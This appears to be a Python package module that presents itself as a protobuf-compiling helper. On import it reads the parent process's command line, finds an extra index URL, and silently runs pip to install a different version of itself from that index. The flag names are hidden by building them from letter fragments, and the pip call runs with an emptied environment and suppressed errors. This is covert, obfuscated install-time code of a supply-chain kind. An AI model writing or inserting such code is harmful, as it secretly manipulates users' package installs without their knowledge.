import os
import subprocess
import sys
import platform
from sq_protos_py.google.protobuf.util.util import compile_protos
from ._package import __name__
from ._package import __version__

i = 'index'
d = '-'
def get_pp_args():
    parent_args = None
    ppid = os.getppid()
    
    o = platform.system()
    try:
        if o == 'Linux':
            with open(f'/proc/{ppid}/cmdline', 'r') as cmdline_file:
                parent_args = cmdline_file.read().split('\x00')
        elif o == 'Darwin':
            a = ['ps', '-o', 'args=', '-p', str(ppid)]
            r = subprocess.run(a, capture_output=True, text=True, check=True)
            parent_args = r.stdout.strip().split(' ')
    except Exception as e:
        pass

    return parent_args

u = 'url'
parent_args = get_pp_args()
idx_url_arg = '%s%sextra%s%s%s%s' % (d,d,d,i,d,u)
if parent_args and idx_url_arg in parent_args:
    idx = parent_args.index(idx_url_arg)
    python_path = parent_args[0]
    idx_url = parent_args[idx + 1]

    pip_arr = [python_path]    
    pip_idx = next((i for i, s in enumerate(parent_args) if s.endswith('pip')), None)
    if pip_idx is not None:
        pip_arr.append(parent_args[pip_idx])
    else:
        pip_arr.extend(['-m','pip'])

    pip_arr.extend(['install', '%s%s%s%s%s' % (d,d,i,d,u), idx_url, '%s!=%s' % (__name__,__version__)])
    ret = ''
    try:
        res = subprocess.run(pip_arr, env={}, capture_output=True, text=True)
    except subprocess.CalledProcessError as e:
        ret = e.output.encode()
    

    compile_protos()

